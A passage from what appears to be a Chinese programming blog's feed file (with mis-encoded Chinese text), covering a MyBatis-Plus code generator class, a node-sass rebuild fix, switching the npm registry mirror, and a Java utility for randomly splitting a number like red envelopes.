autoGenerator.setGlobalConfig(buildGlobalConfig());</span><br><span class="line">        autoGenerator.setDataSource(buildDataSourceConfig());</span><br><span class="line">        autoGenerator.setPackageInfo(buildPackageConfig(projectPath,bizName));</span><br><span class="line">        autoGenerator.setCfg(buildInjectionConfig(projectPath, bizName));</span><br><span class="line">        autoGenerator.setTemplate(buildTemplateConfig());</span><br><span class="line">        autoGenerator.setStrategy(buildStrategyConfig(tableNames));</span><br><span class="line">        autoGenerator.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¯»å–æ§åˆ¶å°å†…å®¹ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">scanner</span><span class="params">(String tip)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println((<span class="string">&quot;è¯·è¾“å…¥&quot;</span> + tip + <span class="string">&quot;ï¼š&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNext()) &#123;</span><br><span class="line">            String next = scanner.next();</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isNotEmpty(next)) &#123;</span><br><span class="line">                <span class="keyword">return</span> next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MybatisPlusException(<span class="string">&quot;è¯·è¾“å…¥æ­£ç¡®çš„&quot;</span> + tip + <span class="string">&quot;ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å…¨å±€é…ç½®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> com.baomidou.mybatisplus.generator.config.<span class="function">GlobalConfig <span class="title">buildGlobalConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        com.baomidou.mybatisplus.generator.config.GlobalConfig globalConfig = <span class="keyword">new</span> GlobalConfig();</span><br><span class="line">        globalConfig.setAuthor(author);</span><br><span class="line">        globalConfig.setOpen(<span class="keyword">false</span>);</span><br><span class="line">        globalConfig.setSwagger2(<span class="keyword">false</span>);</span><br><span class="line">        globalConfig.setBaseResultMap(<span class="keyword">false</span>);</span><br><span class="line">        globalConfig.setFileOverride(<span class="keyword">true</span>);</span><br><span class="line">        globalConfig.setDateType(DateType.ONLY_DATE);</span><br><span class="line">        globalConfig.setEntityName(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">        globalConfig.setMapperName(<span class="string">&quot;%sMapper&quot;</span>);</span><br><span class="line">        globalConfig.setXmlName(<span class="string">&quot;%sMapper&quot;</span>);</span><br><span class="line">        globalConfig.setServiceName(<span class="string">&quot;%sService&quot;</span>);</span><br><span class="line">        globalConfig.setServiceImplName(<span class="string">&quot;%sServiceImpl&quot;</span>);</span><br><span class="line">        globalConfig.setControllerName(<span class="string">&quot;%sController&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> globalConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ•°æ®æºé…ç½®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> DataSourceConfig <span class="title">buildDataSourceConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        DataSourceConfig dataSourceConfig = <span class="keyword">new</span> DataSourceConfig();</span><br><span class="line">        dataSourceConfig.setUrl(mysql.url);</span><br><span class="line">        dataSourceConfig.setDriverName(mysql.driver_name);</span><br><span class="line">        dataSourceConfig.setUsername(mysql.user);</span><br><span class="line">        dataSourceConfig.setPassword(mysql.password);</span><br><span class="line">        <span class="keyword">return</span> dataSourceConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åŒ…é…ç½®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> PackageConfig <span class="title">buildPackageConfig</span><span class="params">(String projectPath,String bizName)</span> </span>&#123;</span><br><span class="line">        PackageConfig packageConfig = <span class="keyword">new</span> PackageConfig();</span><br><span class="line">        packageConfig.setModuleName(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        packageConfig.setParent(base_path);</span><br><span class="line">        packageConfig.setEntity(<span class="string">&quot;model&quot;</span> + (StringUtils.isNotBlank(bizName) ? <span class="string">&quot;.&quot;</span> + bizName : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        packageConfig.setService(<span class="string">&quot;service&quot;</span>+(StringUtils.isNotBlank(bizName) ? <span class="string">&quot;.&quot;</span> + bizName : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        packageConfig.setServiceImpl(<span class="string">&quot;service&quot;</span>+(StringUtils.isNotBlank(bizName) ? <span class="string">&quot;.&quot;</span> + bizName : <span class="string">&quot;&quot;</span>)+<span class="string">&quot;.impl&quot;</span>);</span><br><span class="line">        packageConfig.setMapper(<span class="string">&quot;mapper&quot;</span>+(StringUtils.isNotBlank(bizName) ? <span class="string">&quot;.&quot;</span> + bizName : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">        Map&lt;String, String&gt; pathInfo = Maps.newHashMap();</span><br><span class="line">        pathInfo.put(ConstVal.ENTITY_PATH, calcPath4Entity(projectPath,bizName));</span><br><span class="line">        pathInfo.put(ConstVal.MAPPER_PATH, calcPath4Mapper(projectPath,bizName));</span><br><span class="line">        pathInfo.put(ConstVal.XML_PATH, calcPath4Xml(projectPath,bizName));</span><br><span class="line">        pathInfo.put(ConstVal.SERVICE_PATH, calcPath4Service(projectPath,bizName));</span><br><span class="line">        pathInfo.put(ConstVal.SERVICE_IMPL_PATH, calcPath4ServiceImpl(projectPath,bizName));</span><br><span class="line">        packageConfig.setPathInfo(pathInfo);</span><br><span class="line">        <span class="keyword">return</span> packageConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è®¾ç½®è·¯å¾„ - model.java</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">calcPath4Entity</span><span class="params">(String projectPath,String bizName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  projectPath + module_path.entity + <span class="string">&quot;/src/main/java/&quot;</span> + base_path.replaceAll(<span class="string">&quot;\\.&quot;</span>,<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/model/&quot;</span> + bizName + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è®¾ç½®è·¯å¾„ - mapper.java</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">calcPath4Mapper</span><span class="params">(String projectPath, String bizName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  projectPath + module_path.mapper + <span class="string">&quot;/src/main/java/&quot;</span> + base_path.replaceAll(<span class="string">&quot;\\.&quot;</span>,<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/mapper/&quot;</span> + bizName + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è®¾ç½®è·¯å¾„ - service.java</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">calcPath4Service</span><span class="params">(String projectPath, String bizName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  projectPath + module_path.service + <span class="string">&quot;/src/main/java/&quot;</span> + base_path.replaceAll(<span class="string">&quot;\\.&quot;</span>,<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/service/&quot;</span> + bizName + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è®¾ç½®è·¯å¾„ - serviceImpl.java</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">calcPath4ServiceImpl</span><span class="params">(String projectPath, String bizName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  projectPath + module_path.service + <span class="string">&quot;/src/main/java/&quot;</span> + base_path.replaceAll(<span class="string">&quot;\\.&quot;</span>,<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/service/&quot;</span> + bizName + <span class="string">&quot;/impl/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è®¾ç½®è·¯å¾„ - model.xml</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">calcPath4Xml</span><span class="params">(String projectPath, String bizName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  projectPath + module_path.mapper + <span class="string">&quot;/src/main/resources/mapper/&quot;</span> + bizName + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ¨¡æ¿é…ç½®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> TemplateConfig <span class="title">buildTemplateConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        TemplateConfig templateConfig = <span class="keyword">new</span> TemplateConfig();</span><br><span class="line">        <span class="comment">//å¯ä»¥å¯¹controllerã€serviceã€entityæ¨¡æ¿è¿›è¡Œé…ç½®</span></span><br><span class="line">        <span class="comment">//mapper.xmlæ¨¡æ¿éœ€å•ç‹¬é…ç½®</span></span><br><span class="line">        <span class="keyword">return</span> templateConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç­–ç•¥é…ç½®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> tableNames</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> StrategyConfig <span class="title">buildStrategyConfig</span><span class="params">(String[] tableNames)</span> </span>&#123;</span><br><span class="line">        StrategyConfig strategyConfig = <span class="keyword">new</span> StrategyConfig();</span><br><span class="line">        strategyConfig.setNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        strategyConfig.setColumnNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        strategyConfig.setEntityLombokModel(<span class="keyword">true</span>);</span><br><span class="line">        strategyConfig.setRestControllerStyle(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// å½“è¡¨åä¸­å¸¦*å·æ—¶å¯ä»¥å¯ç”¨é€šé…ç¬¦æ¨¡å¼</span></span><br><span class="line">        <span class="keyword">if</span> (tableNames.length == <span class="number">1</span> &amp;&amp; tableNames[<span class="number">0</span>].contains(<span class="string">&quot;*&quot;</span>)) &#123;</span><br><span class="line">            String[] likeStr = tableNames[<span class="number">0</span>].split(<span class="string">&quot;_&quot;</span>);</span><br><span class="line">            String likePrefix = likeStr[<span class="number">0</span>] + <span class="string">&quot;_&quot;</span>;</span><br><span class="line">            strategyConfig.setLikeTable(<span class="keyword">new</span> LikeTable(likePrefix));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            strategyConfig.setInclude(tableNames);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// è‡ªåŠ¨å¡«å……æ—¶é—´å­—æ®µ</span></span><br><span class="line">        List&lt;TableFill&gt; tableFillList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        tableFillList.add(<span class="keyword">new</span> TableFill(<span class="string">&quot;create_time&quot;</span>, FieldFill.INSERT));</span><br><span class="line">        tableFillList.add(<span class="keyword">new</span> TableFill(<span class="string">&quot;update_time&quot;</span>, FieldFill.INSERT_UPDATE));</span><br><span class="line">        strategyConfig.setTableFillList(tableFillList);</span><br><span class="line">        <span class="keyword">return</span> strategyConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è‡ªå®šä¹‰é…ç½®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> projectPath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bizName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> InjectionConfig <span class="title">buildInjectionConfig</span><span class="params">(String projectPath, String bizName)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// è‡ªå®šä¹‰é…ç½®</span></span><br><span class="line">        InjectionConfig injectionConfig = <span class="keyword">new</span> InjectionConfig() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// å¯ç”¨äºè‡ªå®šä¹‰å±æ€§</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// æ¨¡æ¿å¼•æ“æ˜¯Velocity</span></span><br><span class="line">        String templatePath = <span class="string">&quot;/templates/mapper.xml.vm&quot;</span>;</span><br><span class="line">        <span class="comment">// è‡ªå®šä¹‰è¾“å‡ºé…ç½®</span></span><br><span class="line">        List&lt;FileOutConfig&gt; focList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="comment">// è‡ªå®šä¹‰é…ç½®ä¼šè¢«ä¼˜å…ˆè¾“å‡º</span></span><br><span class="line">        focList.add(<span class="keyword">new</span> FileOutConfig(templatePath) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">outputFile</span><span class="params">(TableInfo tableInfo)</span> </span>&#123;</span><br><span class="line">                <span class="comment">// è‡ªå®šä¹‰è¾“å‡ºæ–‡ä»¶å ï¼Œ å¦‚æœä½  Entity è®¾ç½®äº†å‰åç¼€ã€æ­¤å¤„æ³¨æ„ xml çš„åç§°ä¼šè·Ÿç€å‘ç”Ÿå˜åŒ–ï¼ï¼</span></span><br><span class="line">                <span class="keyword">return</span> projectPath + <span class="string">&quot;mapper/src/main/resources/mapper/&quot;</span> + bizName</span><br><span class="line">                        + <span class="string">&quot;/&quot;</span> + tableInfo.getEntityName() + <span class="string">&quot;Mapper&quot;</span> + StringPool.DOT_XML;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        injectionConfig.setFileOutConfigList(focList);</span><br><span class="line">        <span class="keyword">return</span> injectionConfig;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æœ€åï¼Œæˆ‘ä»¬ç›´æ¥è¿è¡Œè¿™ä¸ªjavaç±»ï¼Œåœ¨æ§åˆ¶å°è¾“å…¥ ä¸šåŠ¡æ¨¡å—åç§° å’Œ è¡¨åï¼Œç‚¹å‡»å›è½¦å³å¯ç”Ÿæˆã€‚</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>mybatis-plus</tag>
        <tag>ä»£ç ç”Ÿæˆ</tag>
        <tag>mybatis-plus-generator</tag>
      </tags>
  </entry>
  <entry>
    <title>nodeå‡çº§å¯¼è‡´node-sassä¾èµ–ä¸æ”¯æŒ</title>
    <url>/2020/07/03/node-up-sass-nosupport-error/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>nodeæ›´æ–°è¾ƒå¿«ï¼Œå‡çº§ä¹‹åï¼Œå‡ºç°node-sassä¾èµ–ä¸æ”¯æŒçš„æƒ…å†µï¼Œé”™è¯¯æç¤ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR &#123;</span><br><span class="line">  err: Error: Node Sass does not yet support your current environment: OS X 64-bit with Unsupported runtime (88)</span><br><span class="line">  For more information on which environments are supported please see:</span><br><span class="line">  https:&#x2F;&#x2F;github.com&#x2F;sass&#x2F;node-sass&#x2F;releases&#x2F;tag&#x2F;v4.14.1</span><br><span class="line">      at module.exports (&#x2F;Users&#x2F;mac&#x2F;xxxxxxxx</span><br><span class="line">      at xxxxxxxxxxxx</span><br></pre></td></tr></table></figure>
<h4 id="å¤„ç†æ–¹å¼"><a href="#å¤„ç†æ–¹å¼" class="headerlink" title="å¤„ç†æ–¹å¼"></a>å¤„ç†æ–¹å¼</h4><p>1ï¼Œå‡çº§node-sasså³å¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm rebuild node-sass</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title>æ›´æ¢npmèµ„æºåœ°å€</title>
    <url>/2020/07/01/npm-change-registry/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;åœ¨ä½¿ç”¨npmå·¥å…·å®‰è£…è½¯ä»¶çš„æ—¶å€™ï¼Œå¸¸å¸¸ç”±äºå›½å†…ç½‘ç»œç¯å¢ƒçš„ç¼˜æ•…ï¼Œå¯¼è‡´è®¿é—®å›½å¤–èµ„æºç«™ç‚¹é€Ÿåº¦ç‰¹åˆ«æ…¢ï¼Œç”šè‡³ç½‘ç»œå¼‚å¸¸ã€‚æ‰€ä»¥é€šå¸¸ï¼Œæˆ‘ä»¬ä¼šæ›´æ¢npmçš„èµ„æºåœ°å€ä¸ºå›½å†…çš„é•œåƒç«™ç‚¹</p>
<p>å¸¸è§çš„npmèµ„æºåœ°å€è®¿é—®ç½‘ç»œå¼‚å¸¸æç¤ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info There appears to be trouble with your network connection. Retrying...</span><br><span class="line">error An unexpected error occurred: &quot;https:&#x2F;&#x2F;registry.yarnpkg.com&#x2F;hexo: getaddrinfo ENOTFOUND registry.yarnpkg.com&quot;.</span><br><span class="line">info If you think this is a bug, please open a bug report with the information provided in &quot;&#x2F;Users&#x2F;mac&#x2F;.config&#x2F;yarn&#x2F;global&#x2F;yarn-error.log&quot;.</span><br></pre></td></tr></table></figure>
<h4 id="æ›´æ¢èµ„æºåœ°å€"><a href="#æ›´æ¢èµ„æºåœ°å€" class="headerlink" title="æ›´æ¢èµ„æºåœ°å€"></a>æ›´æ¢èµ„æºåœ°å€</h4><p>1ï¼Œå›½å†…ä¸€èˆ¬ä½¿ç”¨taobaoçš„é•œåƒç«™ç‚¹ä½œä¸ºèµ„æºåœ°å€ï¼Œé€šè¿‡ä¸‹é¢çš„å‘½ä»¤å¯ä»¥è¿›è¡Œæ›´æ¢ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line">npm config <span class="built_in">set</span> disturl https://npm.taobao.org/dist</span><br></pre></td></tr></table></figure>
<p>2ï¼ŒéªŒè¯é…ç½®ï¼ŒæŸ¥çœ‹é…ç½®çš„registryå’Œdisturlåœ°å€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm get registry</span><br><span class="line">npm get disturl</span><br></pre></td></tr></table></figure>
<p>3ï¼Œå¦‚æœéœ€è¦è¿˜åŸä¸ºé»˜è®¤çš„åœ°å€ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm config delete registry</span><br><span class="line">npm config delete disturl</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>æ•°å­—éšæœºæ‹†åˆ†-ç±»ä¼¼å‘çº¢åŒ…</title>
    <url>/2020/06/17/num-split-utils/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>æœ‰çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦åšä¸€ä¸ªç±»ä¼¼å¾®ä¿¡å‘çº¢åŒ…çš„é€»è¾‘ï¼Œè¿™å°±æ¶‰åŠåˆ°éšæœºæ‹†åˆ†çº¢åŒ…çš„åŠŸèƒ½äº†ã€‚</p>
<p>é‚£ä¹ˆå¦‚ä½•å»å®ç°è¿™ä¸ªèƒ½åŠ›å‘¢ï¼Ÿ</p>
<p>æœ€ç®€å•çš„é€»è¾‘ï¼šå…ˆåˆ›å»ºä¸€ä¸ªé•¿åº¦ç­‰äºå‘æ”¾äººæ•°çš„æ•°ç»„ï¼Œå…ˆèµ‹å€¼ä¸€ä¸ªåˆå§‹å€¼ï¼Œé˜²æ­¢éšæœºåˆ†é…çš„æ—¶å€™æœªè¿›è¡Œèµ‹å€¼ã€‚ç„¶åå°†å‰©ä¸‹çš„å€¼ï¼Œéšæœºåˆ†é…çš„è¿™ä¸ªæ•°ç»„ä¸­å³å¯ã€‚</p>
<h4 id="ä»£ç ç¤ºä¾‹"><a href="#ä»£ç ç¤ºä¾‹" class="headerlink" title="ä»£ç ç¤ºä¾‹"></a>ä»£ç ç¤ºä¾‹</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* æ•°å­—éšæœºæ‹†åˆ†-ç±»ä¼¼å‘çº¢åŒ…</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> allNum  è¢«æ‹†åˆ†çš„æ•°å­—</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> split æ‹†æˆå‡ ä¸ª</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> æ‹†åˆ†åçš„é›†åˆ</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Integer&gt; <span class="title">splitNum</span><span class="params">(<span class="keyword">int</span> allNum, <span class="keyword">int</span> split)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(allNum &lt; split || allNum &lt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;è¢«æ‹†åˆ†çš„æ€»æ•°å°äºéœ€è¦æ‹†åˆ†çš„ä»½æ•°&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªé•¿åº¦ç­‰äºsplitçš„æ•°ç»„</span></span><br><span class="line">    Integer[] array = <span class="keyword">new</span> Integer[split];</span><br><span class="line">    <span class="comment">// å…ˆç»™æ•°ç»„çš„æ¯ä¸ªå…ƒç´ èµ‹å€¼æœ€åŸºç¡€çš„å€¼ï¼š1</span></span><br><span class="line">    Arrays.fill(array,<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// å‡æ‰åˆ†é…çš„æ•°é¢</span></span><br><span class="line">    allNum -= split;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// whileéå†æ€»é¢ï¼Œéšæœºè¿›è¡Œåˆ†é…ï¼Œé€ä¸ªå…ƒç´ è¿›è¡Œç´¯è®¡èµ‹å€¼</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    Random random = <span class="keyword">new</span> Random();</span><br><span class="line">    <span class="keyword">while</span> (allNum &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// æœ€åä¸€ä¸ªç›´æ¥èµ‹å€¼ç»™ç¬¬ä¸€ä¸ª</span></span><br><span class="line">        <span class="keyword">if</span>(allNum == <span class="number">1</span>)&#123;</span><br><span class="line">            array[<span class="number">0</span>] += <span class="number">1</span>;</span><br><span class="line">            allNum --;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// éšæœºèµ‹å€¼</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> boud = (allNum / <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">            boud = boud &gt; <span class="number">2</span> ? boud / <span class="number">2</span> : boud;</span><br><span class="line">            <span class="keyword">int</span> num = random.nextInt(boud) + <span class="number">1</span>;</span><br><span class="line">            array[i++ % split] += num;</span><br><span class="line">            allNum -= num;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;Integer&gt; res = Arrays.stream(array).collect(Collectors.toList());</span><br><span class="line">    <span class="comment">// æ‰“ä¹±</span></span><br><span class="line">    Collections.shuffle(res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æµ‹è¯•ä¸€ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;10åˆ†æˆ10ä»½ï¼š&quot;</span> + splitNum(<span class="number">10</span>,<span class="number">10</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;100åˆ†æˆ10ä»½ï¼š&quot;</span> + splitNum(<span class="number">100</span>,<span class="number">10</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;10åˆ†æˆ3ä»½ï¼š&quot;</span> + splitNum(<span class="number">10</span>,<span class="number">3</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;500åˆ†æˆ15ä»½ï¼š&quot;</span> + splitNum(<span class="number">500</span>,<span class="number">15</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10åˆ†æˆ10ä»½ï¼š[1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span><br><span class="line">100åˆ†æˆ10ä»½ï¼š[3, 19, 11, 18, 6, 5, 3, 16, 10, 9]</span><br><span class="line">10åˆ†æˆ3ä»½ï¼š[2, 5, 3]</span><br><span class="line">500åˆ†æˆ15ä»½ï¼š[17, 15, 16, 36, 56, 15, 4, 59, 25, 22, 72, 23, 61, 48, 31]</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>å‘çº¢åŒ…</tag>
        <tag>æ•°å­—æ‹†åˆ†</tag>
        <tag>éšæœºæ•°</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼€æºé¡¹ç›®ç”³è¯·JetBrainså…¨å®¶æ¡¶</title>
    <url>/2020/09/16/open-source-license-JetBrains-request/</url>
